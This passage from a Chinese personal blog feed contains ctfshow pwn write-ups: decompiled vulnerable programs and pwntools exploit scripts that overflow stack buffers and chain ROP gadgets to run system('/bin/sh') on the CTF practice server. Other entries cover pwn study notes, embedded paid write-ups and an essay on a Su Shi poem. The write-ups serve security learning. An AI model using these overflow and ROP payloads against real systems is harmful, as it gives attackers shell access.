class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : It has system and &#x27;/bin/sh&#x27;.There is a backdoor function&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just easy ret2text&amp;&amp;64bit&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>与32位不同之处</strong>：需要考虑到堆栈平衡加上ret返回地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28294</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400287</span>  <span class="comment"># 0x0000000000400287 : ret</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xA</span>+<span class="number">8</span>) + p64(ret) + p64(backdoor)</span><br><span class="line"><span class="comment"># 这里的b&#x27;a&#x27; * (0xA+8)是用来填充的，0xA对应buf数组的大小（10字节），加上额外的8字节以覆盖返回地址。p64(ret)和p64(backdoor)分别用于插入ret gadget和backdoor函数的地址。</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()  <span class="comment"># 接收响应</span></span><br><span class="line"></span><br><span class="line">io.interactive()  <span class="comment"># 进入交互模式</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">返回地址的覆盖：</span></span><br><span class="line"><span class="string">在64位中，地址是64位长的，因此需要使用p64()函数来正确地构造返回地址。此外，由于64位架构中函数调用的参数通常通过寄存器传递，栈上可能会有更多的空隙，因此在构造payload时需要更精确地计算填充长度</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">64位架构下的栈溢出攻击需要更加注意栈的对齐和堆栈平衡，同时使用p64()函数来构造正确的64位地址。在构造payload时，还需要插入适当的ret gadget以确保正确的函数调用流程</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ctfshow{acb00b19-9c0e-49ca-8a0c-3819a7a9ecf7}</li>
</ul>
<h3 id="039-栈溢出-32位手动构造system-“-bin-sh”"><a class="header-anchor" href="#039-栈溢出-32位手动构造system-“-bin-sh”">¶</a>039 栈溢出+32位手动构造system(“/bin/sh”)</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn039/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">32位 关闭了栈保护与PIE</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 美术部分</span></span><br><span class="line">  <span class="built_in">puts</span>(asc_804876C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80487E0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804885C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488E8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048978);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489FC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A90);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just easy ret2text&amp;&amp;32bit&quot;</span>);</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32</span>u);  <span class="comment">// 通过read系统调用读取最多50字节的数据到buf中。由于buf的大小小于读取的字节数，这就产生了栈溢出的可能性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;You find me?&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28195</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = <span class="number">0x8048750</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line"><span class="comment"># 前半部分&#x27;a&#x27;*(0x12+4)是用来填充并覆盖返回地址的</span></span><br><span class="line"><span class="comment"># p32(system)是system函数的地址，通过elf.sym[&#x27;system&#x27;]获取。system函数接受一个字符串参数并执行它，这正是我们想要利用的功能</span></span><br><span class="line"><span class="comment"># p32(0)是多余的返回地址，因为system函数通常不会返回。但是，为了构造payload的完整性，这里放置了一个地址，这个地址实际上不会被执行</span></span><br><span class="line"><span class="comment"># p32(bin_sh)是/bin/sh字符串的地址。由于system函数需要一个字符串参数，所以这里需要/bin/sh的地址。在这个二进制文件中，/bin/sh字符串已经被硬编码了，其地址是0x8048750（这是哪里看的？</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)  <span class="comment"># sendline函数用于发送构造好的payload。sendline会自动在payload末尾添加一个换行符，这通常与read系统调用期望的输入格式相匹配</span></span><br><span class="line">io.recv()  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>ctfshow{fc36efc2-3af6-4607-9296-a1bfbbe8eaaa}</li>
</ul>
<h3 id="040-栈溢出-64位手动构造system-“-bin-sh”"><a class="header-anchor" href="#040-栈溢出-64位手动构造system-“-bin-sh”">¶</a>040 栈溢出+64位手动构造system(“/bin/sh”)</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn040/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">64位   关闭了栈保护和PIE</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400828);</span><br><span class="line">  <span class="built_in">puts</span>(asc_4008A0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400920);</span><br><span class="line">  <span class="built_in">puts</span>(asc_4009B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400A40);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400AC8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just easy ret2text&amp;&amp;64bit&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;You find me?&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有system函数，有‘/bin/sh’字符串，但是不在一起，因此我们仍然需要手动进行构造payload</li>
<li>64位和32位不同，参数不是直接放在栈上，而是优先放在寄存器rdi,rsi,rdx,rcx,r8,r9。这几个寄存器放不下时才会考虑栈</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28309</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = <span class="number">0x400808</span></span><br><span class="line">pop_rdi = <span class="number">0x4007e3</span> <span class="comment"># 0x00000000004007e3 : pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	①&#x27;a&#x27;*(0xA+8) : 这部分生成了一个由字符 &#x27;a&#x27; 组成的字符串，长度为0xA+8。这是为了填充缓冲区，达到溢出栈帧的目的</span></span><br><span class="line"><span class="string">	 ②p64(pop_rdi) : 这部分使用 p64 函数将 pop_rdi 的地址转换为一个8字节的字符串。pop_rdi 指令用于将值从栈上弹出并存储到寄存器rdi中。在这个payload中，它用于准备传递给 system 函数的第一个参数</span></span><br><span class="line"><span class="string">	 ③p64(bin_sh) : 这部分使用 p64 函数将 bin_sh 的地址转换为一个8字节的字符串。 bin_sh 通常是指向包含要执行的命令的字符串（如 /bin/sh ）的指针。该字符串将作为 system 函数的第一个参数</span></span><br><span class="line"><span class="string">	 ④ p64(ret) : 这部分使用 p64 函数将 ret 的地址转换为一个8字节的字符串。 ret 是一个返回指令，用于将程序控制权返回到栈上保存的地址。在这个payload中，它被用作一个间接跳转指令，用于绕过栈中的返回地址，以达到执行 system 函数的目的</span></span><br><span class="line"><span class="string">	 ⑤p64(system) : 这部分使用 p64 函数将 system 的函数地址转换为一个8字节的字符串。system 是一个函数指针，指向一个可以执行系统命令的函数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">最终我们的目的就是通过栈溢出修改返回地址，以控制程序执行流程。</span></span><br><span class="line"><span class="string">它通过调用 pop_rdi 指令将bin_sh 的地址加载到寄存器rdi中，然后通过 ret 指令进行间接跳转，最终调用 system 函数，以执行system(“/bin/sh”)进而获得一个我们想要的shell</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>ctfshow{53e6a886-b8f0-4a6e-b306-ccfc10370001}</li>
</ul>
<h3 id="041"><a class="header-anchor" href="#041">¶</a>041</h3>
<p>他妈的好难啊啊啊啊啊啊啊啊啊</p>
<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<p>作为一名CTF（Capture The Flag）竞赛中专注于PWN方向的专家，我（调教过的通义灵码）具备以下技能和知识：</p>
<ol>
<li><strong>二进制漏洞利用</strong>：理解并利用缓冲区溢出、格式化字符串漏洞、整数溢出、使用-after-free、双free等常见漏洞。</li>
<li><strong>调试技巧</strong>：熟练使用GDB进行调试，包括设置断点、单步执行、查看内存和寄存器状态等。</li>
<li><strong>逆向工程</strong>：能够使用IDA Pro、Binary Ninja或Ghidra等工具分析二进制程序，理解函数逻辑和数据流。</li>
<li><strong>ROP（Return-Oriented Programming）</strong>：掌握ROP技术，能够在禁止执行堆栈的情况下构造ROP链以实现任意代码执行。</li>
<li><strong>Python编程</strong>：擅长使用Python编写脚本来自动化漏洞利用流程，如生成payload、解析二进制文件、与目标服务交互等。</li>
<li><strong>网络协议和安全</strong>：了解TCP/IP协议栈，能够分析网络通信，识别和利用网络服务中的漏洞。</li>
<li><strong>操作系统安全机制</strong>：理解ASLR（地址空间布局随机化）、NX（No eXecute）位、Canary值等现代操作系统安全特性，并能绕过它们。</li>
<li><strong>工具使用</strong>：熟悉pwntools、ROPgadget、radare2等工具在PWN中的应用。</li>
<li><strong>编写和破解Exploit</strong>：能够编写稳定的exploit，并对现有的exploit进行分析和修改以适应不同的环境。</li>
</ol>
<p>如果你正在准备一个CTF比赛或者遇到某个具体的PWN挑战，我可以帮助你分析问题，提供解决方案，或者指导你如何编写相应的Python脚本来辅助你的工作。请告诉我你具体需要哪方面的帮助。</p>
<p>当然，不过为了给出更准确的分析，我需要你先提供一些关于题目本身的信息。不过，我可以基于一些常见的PWN题目类型来推测可能涉及的知识点。</p>
<p>假设我们讨论的是一个典型的PWN题目，那么它可能会涉及到以下几个方面：</p>
<h4 id="1-二进制分析"><a class="header-anchor" href="#1-二进制分析">¶</a>1. <strong>二进制分析</strong></h4>
<ul>
<li><strong>ELF文件结构</strong>：理解ELF文件的结构，包括段（segments）和节（sections），例如<code>.text</code>、<code>.data</code>、<code>.bss</code>和<code>.rodata</code>等。</li>
<li><strong>动态链接</strong>：了解动态链接的工作原理，包括如何加载共享库和解析符号。</li>
<li><strong>符号表和调试信息</strong>：学习如何利用符号表和DWARF调试信息进行逆向工程和调试。</li>
</ul>
<h4 id="2-漏洞利用"><a class="header-anchor" href="#2-漏洞利用">¶</a>2. <strong>漏洞利用</strong></h4>
<ul>
<li><strong>缓冲区溢出</strong>：利用缓冲区溢出来覆盖返回地址，从而控制程序的执行流程。</li>
<li><strong>格式化字符串漏洞</strong>：利用格式化字符串漏洞读取或写入内存。</li>
<li><strong>整数溢出</strong>：当整数运算结果超出其表示范围时，可以导致意外的行为或漏洞。</li>
<li><strong>使用-after-free</strong>：在释放内存后重新使用该内存块可能导致的漏洞。</li>
<li><strong>双free</strong>：同一内存区域被释放两次可能导致的未定义行为。</li>
<li><strong>堆喷射</strong>：通过精心设计的输入，可以在堆上分配和控制特定的内存块。</li>
</ul>
<h4 id="3-绕过安全机制"><a class="header-anchor" href="#3-绕过安全机制">¶</a>3. <strong>绕过安全机制</strong></h4>
<ul>
<li><strong>ASLR（地址空间布局随机化）</strong>：通过预测或泄漏基地址来绕过ASLR保护。</li>
<li><strong>DEP（数据执行保护）</strong>：使用NOP滑块或ROP技术绕过DEP，使得非代码段内存也可以执行。</li>
<li><strong>Canary值</strong>：理解和绕过用于检测缓冲区溢出的canary值。</li>
</ul>
<h4 id="4-ROP（Return-Oriented-Programming）"><a class="header-anchor" href="#4-ROP（Return-Oriented-Programming）">¶</a>4. <strong>ROP（Return-Oriented Programming）</strong></h4>
<ul>
<li><strong>ROP基础</strong>：如何寻找和利用ROP小工具来构建ROP链。</li>
<li><strong>ROPgadget工具</strong>：使用ROPgadget来自动搜索ROP小工具。</li>
</ul>
<h4 id="5-调试和逆向工程"><a class="header-anchor" href="#5-调试和逆向工程">¶</a>5. <strong>调试和逆向工程</strong></h4>
<ul>
<li><strong>GDB</strong>：使用GDB进行调试，包括设置断点、单步执行、检查内存和寄存器状态。</li>
<li><strong>IDA Pro或Binary Ninja</strong>：使用逆向工程工具来分析二进制文件的内部结构和逻辑。</li>
</ul>
<h4 id="6-自动化脚本"><a class="header-anchor" href="#6-自动化脚本">¶</a>6. <strong>自动化脚本</strong></h4>
<ul>
<li><strong>pwntools</strong>：使用pwntools库来自动化漏洞利用的过程，包括与远程服务交互和构造payload。</li>
</ul>
<p>一旦你提供了具体的题目细节，我可以针对那些特定的知识点提供更深入的解释和指导。请分享题目的相关信息，这样我们可以开始具体的分析。</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>Pwn notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【Pvvn】vvp留档</title>
    <url>/2024/07/16/CS_Notes/PWN/%E3%80%90Pwn%E3%80%91wp%E5%AD%98%E6%A1%A3/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>方便起见把v|v|p统一收到一个地方，文件有点乱。但是因为是付|费|内|容所以很担心可能的律|师|函警告。。。。所以保险起见先把仓库地址和邮箱放这里如有侵|权请联系在下orz会马上删除的。。跪orz</p>
<ul>
<li>
<p>此博客对应的gith|ub仓库地址：<a href="https://github.com/brocademaple/brocademaple.github.io">brocademaple/brocademaple.github.io</a></p>
</li>
<li>
<p>苯人邮|箱：1300672728@qq.com</p>
</li>
<li>
<p>并且还要做一些防|搜|索保护。。。。</p>
</li>
</ul>
<h3 id="0-0-1-0-3-6"><a class="header-anchor" href="#0-0-1-0-3-6">¶</a>0|0|1-0|3|6</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/9rkGKLES9q0fBp?hostedIn=slideshare&amp;page=upload&quot;" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h3 id="0-3-7-0-7-2"><a class="header-anchor" href="#0-3-7-0-7-2">¶</a>0|3|7-|0|7|2</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/4CxnYCwT8q57hu?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h3 id="0-7-3-1-0-8"><a class="header-anchor" href="#0-7-3-1-0-8">¶</a>0|7|3-|1|0|8</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/sDflqYKwHnd0f5?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h3 id="中-期-测-试"><a class="header-anchor" href="#中-期-测-试">¶</a>中|期|测|试</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/GacKXJvz6vH0l6?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<p>偷感很重的在学pvvn的大学生一枚吖 QwQ</p>
</div></div></div></div>]]></content>
      <categories>
        <category>notes</category>
        <category>Pwn notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【你想有多pwn】2.3 程序的内存布局及函数调用过程</title>
    <url>/2024/09/06/CS_Notes/PWN/%E3%80%90%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9Apwn%E3%80%912.3-%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E5%8F%8A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.bilibili.com/video/BV1mr4y1Y7fW?p=13&amp;vd_source=3f0983ef34615b702fec513c41e55a64">第二章_第3节_程序的内存布局及函数调用过程_x1_哔哩哔哩_bilibili</a></p>
<h3 id="解题的流程"><a class="header-anchor" href="#解题的流程">¶</a>解题的流程</h3>
<ul>
<li>
<p>假设题目文件名为<code>pwn</code></p>
</li>
<li>
<p>遇到题目：先运行题目文件：<code>./pwn</code></p>
</li>
<li>
<p>然后<code>checksec pwn</code>   看看是个什么程序</p>
</li>
<li>
<p>上一步确认文件是32位还是64位，拖进对应ida反编译一下</p>
</li>
<li>
<p>在命令行中用<code>gdb</code>调试一下：<code>gdb pwn</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>Pwn notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【人间烟火皆是诗】海棠-苏轼</title>
    <url>/2024/07/22/%E6%96%87%E5%8F%B2%E5%93%B2/%E8%AF%97%E6%96%87%E8%AF%8D/%E3%80%90%E4%BA%BA%E9%97%B4%E7%83%9F%E7%81%AB%E7%9A%86%E6%98%AF%E8%AF%97%E3%80%91%E6%B5%B7%E6%A3%A0-%E8%8B%8F%E8%BD%BC/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>今日读诗，bgm是白光的金曲</p>
<p>BV1ok4y1L7Y1</p>
<h3 id="从此始"><a class="header-anchor" href="#从此始">¶</a>从此始</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">海棠·东风袅袅泛崇光</span><br><span class="line">		苏轼</span><br><span class="line">           东风袅袅泛崇光，香雾空蒙月转廊。</span><br><span class="line">           只恐夜深花睡去，故烧高烛照红妆。</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>他在《自题金山画像》中说：“心似已灰之木，身如不系之舟。问汝平生功业，黄州惠州儋州。”这是苏轼对自己一生的总结，很淡然。在长达十年的外放期间，苏轼创作了大量优秀的作品，这首《海棠》就是其在被贬黄州期间写作的。</p>
</li>
<li>
<p>海棠是一种落叶小乔木，树姿优美，叶子椭圆形，春天开白花或者粉红色花，入秋后，金果满树，芳香袭人。海棠一直被古代文人视为珍品，也有大量有关海棠的诗词流传。如南宋李清照那首家喻户晓的《如梦令》：“昨夜雨疏风骤，浓睡不消残酒。试问卷帘人，却道海棠依旧。知否，知否？应是绿肥红瘦。”</p>
</li>
<li>
<p>第三、四句“只恐夜深花睡去，故烧高烛照红妆”，化用了唐明皇和杨贵妃的典故。</p>
<ul>
<li>东坡作《海棠》诗曰：“只恐夜深花睡去，高烧银烛照红妆。”事见《太真外传》，曰：“上皇登沈香亭，诏太真妃子。妃于时卯醉未醒，命力士从侍儿扶掖而至。妃子醉颜残妆，鬓乱钗横，不能再拜。上皇笑曰：‘是岂妃子醉，真海棠睡未足耳。’”   ——宋 释慧洪 《冷斋夜话》 卷一</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">寓居定惠院之东杂花满山有海棠一株土人不知贵也</span><br><span class="line">				苏轼</span><br><span class="line">	江城地瘴蕃草木，只有名花苦幽独。</span><br><span class="line">          嫣然一笑竹篱间，桃李漫山总粗俗。</span><br><span class="line">          也知造物有深意，故遣佳人在空谷。</span><br><span class="line">          自然富贵出天姿，不待金盘荐华屋。</span><br><span class="line">          朱唇得酒晕生脸，翠袖卷纱红映肉。</span><br><span class="line">          林深雾暗晓光迟，日暖风轻春睡足。</span><br><span class="line">          雨中有泪亦凄怆，月下无人更清淑。</span><br><span class="line">          先生食饱无一事，散步逍遥自扪腹。</span><br><span class="line">          不问人家与僧舍，拄杖敲门看修竹。</span><br><span class="line">          忽逢绝艳照衰朽，叹息无言揩病目。</span><br><span class="line">          陋邦何处得此花，无乃好事移西蜀？</span><br><span class="line">          寸根千里不易致，衔子飞来定鸿鹄。</span><br><span class="line">          天涯流落俱可念，为饮一樽歌此曲。</span><br><span class="line">          明朝酒醒还独来，雪落纷纷那忍触。	</span><br></pre></td></tr></table></figure>
<ul>
<li>“天涯流落俱可念，为饮一樽歌此曲。明朝酒醒还独来，雪落纷纷那忍触。”这首著名的咏海棠诗，至此才点明主题。诗人绝不是为咏海棠而咏海棠，而是惊诧名花海棠竟然落户江城黄州，而自己身怀随和之宝却被贬黄州，一个是花中之魁，一个是人中之杰，命运竟如此相似。为和海棠巧遇而痛饮一杯，歌此一曲。明朝酒醒还独来，免得海棠花落时自己更伤心。</li>
<li>这首诗的妙处不在于诗人对海棠的描摹，而在于诗人咏物抒怀之时，将自己与海棠融为一体。</li>
<li>bb：这首诗真的，感觉苏轼他真的超爱，这个辞藻和意境的雕刻。自分最喜欢的几句有：
<ul>
<li>“林深雾暗晓光迟，日暖风轻春睡足。”</li>
<li>“ 雨中有泪亦凄怆，月下无人更清淑。”</li>
<li>“忽逢绝艳照衰朽，叹息无言揩病目。”</li>
<li>“陋邦何处得此花，无乃好事移西蜀？”</li>
<li>“明朝酒醒还独来，雪落纷纷那忍触。”</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>诗文词</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>诗文词</tag>
      </tags>
